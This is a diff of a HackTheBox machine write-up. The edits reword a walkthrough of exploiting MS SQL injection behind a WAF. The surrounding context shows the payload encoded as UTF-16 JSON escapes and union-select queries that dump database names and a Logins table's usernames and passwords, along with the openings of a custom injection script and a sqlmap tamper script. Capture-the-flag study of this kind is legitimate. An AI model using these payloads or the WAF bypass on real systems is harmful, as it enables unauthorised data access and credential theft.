@@ -8,7 +8,7 @@ tags: [notes, hackthebox, machine, windows, mssql, sqli, sqlmap, sqlmap-tamper, 
 published: true
 ---
 
-Automating an SQL injection with a custom sqlmap tamper script to bypass WAF through JSON UTF-16 value representation. Also some RID brute forcing through MS SQL syntax inside.
+Automate MS SQL injection with a custom sqlmap tamper script to bypass WAF through UTF-16BE encoded JSON payload. Enumerate AD domain users via RID cycling from within MS SQL DBMS.
 
 <!--cut-->
 
@@ -30,7 +30,7 @@ Automating an SQL injection with a custom sqlmap tamper script to bypass WAF thr
 
 ## Manual exploitation
 
-JSON format can understand various encodings [including UTF-16BE](https://stackoverflow.com/questions/11641983/encoding-json-in-utf-16-or-utf-32) like follows: `\uXXXX`. The payload `' OR 1=1-- -`, for example, will turn into `\u0027\u0020\u004f\u0052\u0020\u0031\u003d\u0031\u002d\u002d\u0020\u002d` after being encoded. I will abuse that fact to bypass WAF (that blocked pretty much everything) and script the injection:
+JSON format can understand various encodings [including UTF-16BE](https://stackoverflow.com/questions/11641983/encoding-json-in-utf-16-or-utf-32) like follows: `\u00XX`. The payload `' OR 1=1-- -`, for example, will turn into `\u0027\u0020\u004f\u0052\u0020\u0031\u003d\u0031\u002d\u002d\u0020\u002d` after being encoded. I will abuse that fact to bypass WAF (that blocked pretty much everything) and script the injection:
 
 ```python
 #!/usr/bin/env python3
@@ -60,7 +60,7 @@ while True:
 		pass
 ```
 
-Using MS SQL `STUFF()` to emulate MySQL `group_concat()`:
+Then I will use MS SQL `STUFF()` function to emulate MySQL `group_concat()` behavior and dump Hub_DB..Logins table:
 
 ```
 SQLi> 1337' union select '1',STUFF((SELECT ',' + name FROM master..sysdatabases FOR XML PATH ('')), 1, 1, ''),'3','4','5';-- -
@@ -74,7 +74,7 @@ SQLi> 1337' union select '1',STUFF((SELECT ',' + username + ':' + password FROM 
 
 ## sqlmap
 
-To teach sqlmap how to exploit this vulnerability bypassing WAF I will write a custom tamper that converts my payload to UTF-16BE string:
+To teach sqlmap how to exploit this vulnerability with WAF bypass I will write a custom tamper that converts my payload to UTF-16BE string:
 
 ```python
 #!/usr/bin/env python3
